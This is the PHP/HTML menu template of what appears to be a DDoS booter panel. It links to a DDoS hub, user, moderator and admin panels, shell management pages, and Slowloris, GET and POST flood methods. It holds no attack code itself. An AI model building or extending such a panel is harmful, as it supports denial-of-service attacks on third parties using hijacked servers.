<html>
<link href="images/styles.css" rel="stylesheet" type="text/css">
	<body>
		<div id="container">
			<div id="header">
			</div>

<head>
	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
	<link rel="stylesheet" href="CSS3 Menu_files/css3menu1/style.css" type="text/css" />

</head><center>
<ul id="css3menu1" class="topmenu">
	<li class="topmenu"><a href="index.php" title="Home" style="height:16px;line-height:16px;"><span>Home</span></a>
	<ul>
		<li class="sublast"><a href="updates.php" title="Updates">Updates</a></li>
	</ul>

	</li>
	<li class="topmenu"><a href="hub.php" title="DDoS" style="height:16px;line-height:16px;">DDoS</a></li>
	<li class="topmenu"><a href="mysettings.php" title="UserCP" style="height:16px;line-height:16px;">UserCP</a></li>

 <?php  if (checkMod()) { 
                                        // Staff only links should go below here    
                                        ?>
	<li class="topmenu"><a href="staff.php" title="ModCP" style="height:16px;line-height:16px;">ModCP</a></li>

<?php } ?>

	<?php  if (checkAdmin()) { 
                                        // Admin only links should go below here    
                                        ?>

	<li class="topmenu"><a href="admin.php" title="AdminCP" style="height:16px;line-height:16px;"><span>AdminCP</span></a>
	<ul>
		<li class="subfirst"><a href="logs.php" title="Logs">Logs</a></li>
		<li><a href="addshell.php" title="Add Shells">Add Shells</a></li>
		<li class="sublast"><a href="manageshells.php" title="Shell Manager"><span>Shell Manager</span></a>
		<ul>
			<li class="subfirst"><a href="slowloris.php" title="Slowloris">Slowloris</a></li>
			<li><a href="get.php" title="Get">Get</a></li>
			<li class="sublast"><a href="post.php" title="Post">Post</a></li>
		</ul>

		</li>
	</ul>

	</li>
<?php } ?>
	<li class="topmenu"><a href="logout.php" title="Logout" style="height:16px;line-height:16px;">Logout</a></li>
</ul>
</center>
</body>
</html>
<br>
<br>
<br>